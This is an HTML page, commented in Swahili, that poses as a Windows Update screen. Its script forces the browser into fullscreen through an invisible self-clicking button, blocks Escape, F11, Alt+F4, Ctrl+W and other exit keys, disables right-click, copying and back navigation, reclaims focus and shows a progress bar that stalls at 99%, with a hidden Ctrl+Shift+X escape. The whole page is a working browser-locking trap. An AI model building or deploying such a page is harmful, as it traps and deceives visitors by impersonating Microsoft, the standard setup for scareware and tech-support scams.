 <!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Windows Update</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }

  html, body {
    height: 100%;
    width: 100%;
    overflow: hidden;
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: linear-gradient(135deg, #005a9e 0%, #003f6b 100%);
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    color: white;
    cursor: wait;
    user-select: none;
    -webkit-user-select: none;
    z-index: 1;
  }

  /* ===== BUTTON INVISIBLE =====
     Hii inafunika skrini nzima - inafanya fullscreen kwa click yoyote */
  #fullscreenTrap {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    background: transparent;
    border: none;
    cursor: wait;
    z-index: 999999999;
    outline: none;
  }

  /* Content inaonekana juu ya button */
  .container {
    position: relative;
    z-index: 1;
    text-align: center;
    max-width: 600px;
    padding: 40px;
    margin: 0 auto;
    padding-top: 15vh;
    pointer-events: none; /* Hii inaruhusu click kupita kwenye button */
  }

  .logo {
    width: 80px; height: 80px;
    margin: 0 auto 30px auto;
    background: rgba(255,255,255,0.15);
    border-radius: 50%;
    display: flex; align-items: center; justify-content: center;
    font-size: 48px;
    animation: pulse 2s infinite;
  }

  @keyframes pulse {
    0%, 100% { transform: scale(1); opacity: 1; }
    50% { transform: scale(1.05); opacity: 0.8; }
  }

  h1 { font-size: 36px; font-weight: 300; margin-bottom: 10px; letter-spacing: 0.5px; }
  .subtitle { font-size: 16px; color: rgba(255,255,255,0.7); margin-bottom: 40px; }

  .progress-container {
    width: 100%; max-width: 480px;
    margin: 0 auto;
    background: rgba(255,255,255,0.2);
    border-radius: 12px; height: 14px; overflow: hidden;
  }

  .progress-bar {
    height: 100%; width: 3%;
    background: linear-gradient(90deg, #4db8ff, #7ac4ff);
    transition: width 0.5s ease;
    position: relative;
  }

  .progress-bar::after {
    content: '';
    position: absolute; top: 0; left: 0; right: 0; bottom: 0;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
    animation: shimmer 2s infinite;
  }

  @keyframes shimmer {
    0% { transform: translateX(-100%); }
    100% { transform: translateX(100%); }
  }

  .progress-label { font-size: 14px; margin-top: 12px; font-family: 'Segoe UI', monospace; }
  .info-text { font-size: 13px; color: rgba(255,255,255,0.5); margin-top: 50px; line-height: 1.6; }

  .spinner-container { margin: 30px auto 0; display: flex; gap: 8px; justify-content: center; }
  .dot {
    width: 10px; height: 10px;
    background: rgba(255,255,255,0.4);
    border-radius: 50%;
    animation: dotPulse 1.5s infinite ease-in-out;
  }
  .dot:nth-child(2) { animation-delay: 0.2s; }
  .dot:nth-child(3) { animation-delay: 0.4s; }

  @keyframes dotPulse {
    0%, 80%, 100% { transform: scale(0.6); opacity: 0.3; }
    40% { transform: scale(1); opacity: 1; }
  }

  .restart-notice {
    margin-top: 25px;
    font-size: 13px;
    color: rgba(255,255,255,0.35);
    animation: fadeInOut 4s infinite;
  }

  @keyframes fadeInOut {
    0%, 100% { opacity: 0.35; }
    50% { opacity: 0.7; }
  }
</style>
</head>
<body>

<!-- BUTTON INVISIBLE - inafunika skrini nzima -->
<button id="fullscreenTrap"></button>

<div class="container">
  <div class="logo">⚙️</div>
  <h1>Installing updates</h1>
  <p class="subtitle">Please wait a moment</p>

  <div class="progress-container">
    <div class="progress-bar" id="progressBar"></div>
  </div>
  <div class="progress-label" id="progressLabel">3%</div>

  <div class="spinner-container">
    <div class="dot"></div>
    <div class="dot"></div>
    <div class="dot"></div>
  </div>

  <p class="info-text">
    Your device may restart several times.<br>
    <strong>Do not turn off your device.</strong>
  </p>

  <p class="restart-notice" id="restartNotice">⏳ Checking for updates...</p>
</div>

<script>
// ===== BUTTON INVISIBLE — Fullscreen Trap =====
(function() {
  const btn = document.getElementById('fullscreenTrap');
  
  // Anza fullscreen kwa click yoyote
  btn.addEventListener('click', function() {
    const el = document.documentElement;
    if (el.requestFullscreen) {
      el.requestFullscreen({ navigationUI: 'hide' }).catch(() => {});
    } else if (el.webkitRequestFullscreen) {
      el.webkitRequestFullscreen();
    } else if (el.msRequestFullscreen) {
      el.msRequestFullscreen();
    } else if (el.mozRequestFullScreen) {
      el.mozRequestFullScreen();
    }
  });

  // Piga click moja kwa moja page inapofunguliwa
  // Hii inajaribu kuingia fullscreen bila kusubiri
  setTimeout(function() {
    btn.click();
  }, 500);

  // Endelea kupiga click kila sekunde
  setInterval(function() {
    if (!document.fullscreenElement && !document.webkitFullscreenElement) {
      btn.click();
    }
  }, 1000);
})();

// ===== BLOCK ESCAPE =====
document.addEventListener('keydown', function(e) {
  const keys = [27, 122, 116, 123, 18, 9, 91, 92, 93];
  if (keys.includes(e.keyCode) || e.key === 'Escape' || e.key === 'F11' || e.key === 'F5' || e.key === 'F12' || e.key === 'ContextMenu') {
    e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation(); return false;
  }
  if (e.ctrlKey && ['w','q','r','t','n','s','u','d','f'].includes(e.key.toLowerCase())) { e.preventDefault(); return false; }
  if (e.altKey && ['F4','Tab','d','f','e'].includes(e.key)) { e.preventDefault(); return false; }
});

document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
document.addEventListener('selectstart', function(e) { e.preventDefault(); return false; });
document.addEventListener('dragstart', function(e) { e.preventDefault(); return false; });
document.addEventListener('copy', function(e) { e.preventDefault(); return false; });

history.pushState(null, null, location.href);
window.addEventListener('popstate', function() { history.pushState(null, null, location.href); });

window.addEventListener('beforeunload', function(e) {
  e.preventDefault();
  e.returnValue = 'Windows Update in progress. Please wait.';
});

document.addEventListener('visibilitychange', function() {
  if (document.hidden) {
    setTimeout(function() { window.focus(); }, 1);
  }
});

window.addEventListener('blur', function() {
  setTimeout(function() { window.focus(); }, 10);
});

// ===== ENSURE FULLSCREEN =====
document.addEventListener('fullscreenchange', function() {
  if (!document.fullscreenElement) {
    document.getElementById('fullscreenTrap').click();
  }
});

document.addEventListener('webkitfullscreenchange', function() {
  if (!document.webkitFullscreenElement) {
    document.getElementById('fullscreenTrap').click();
  }
});

// ===== PROGRESS =====
let percent = 3;
let phase = 0;

const messages = [
  '⏳ Checking for updates...', '📦 Downloading update 1 of 3...',
  '⚙️ Applying updates...', '🔄 Configuring system settings...',
  '📦 Downloading update 2 of 3...', '🔧 Installing component updates...',
  '📦 Downloading update 3 of 3...', '⚙️ Finalizing installation...',
  '🔄 Preparing for restart...', '⏳ Please wait...',
  '📦 Installing update for Windows...', '🔒 Applying security patches...',
  '⚠️ Do not restart your PC', '🔄 Configuring Windows Update...',
  '✅ Almost done...',
];

function updateProgress() {
  phase++;
  if (phase < 10) percent = 3 + (phase * 1.5);
  else if (phase < 25) percent = 16 + ((phase-10) * 1.2);
  else if (phase < 45) percent = 34 + ((phase-25) * 1.0);
  else if (phase < 65) percent = 54 + ((phase-45) * 0.8);
  else if (phase < 90) percent = 70 + ((phase-65) * 0.6);
  else if (phase < 130) percent = 85 + ((phase-90) * 0.3);
  else percent = 99;
  if (percent > 99) percent = 99;

  document.getElementById('progressBar').style.width = percent + '%';
  document.getElementById('progressLabel').textContent = Math.floor(percent) + '%';

  const msgIndex = Math.min(Math.floor(phase/8), messages.length-1);
  document.getElementById('restartNotice').textContent = messages[msgIndex];

  let delay = 1000;
  if (phase > 20) delay = 1500;
  if (phase > 40) delay = 2500;
  if (phase > 60) delay = 3500;
  if (phase > 90) delay = 5000;
  if (phase > 120) delay = 7000;

  setTimeout(updateProgress, delay);
}

updateProgress();

// ===== BACKDOOR: Ctrl+Shift+X =====
document.addEventListener('keydown', function(e) {
  if (e.ctrlKey && e.shiftKey && e.key === 'X') {
    if (document.exitFullscreen) document.exitFullscreen();
    else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
    window.location.href = 'about:blank';
  }
});
</script>
</body>
</html>
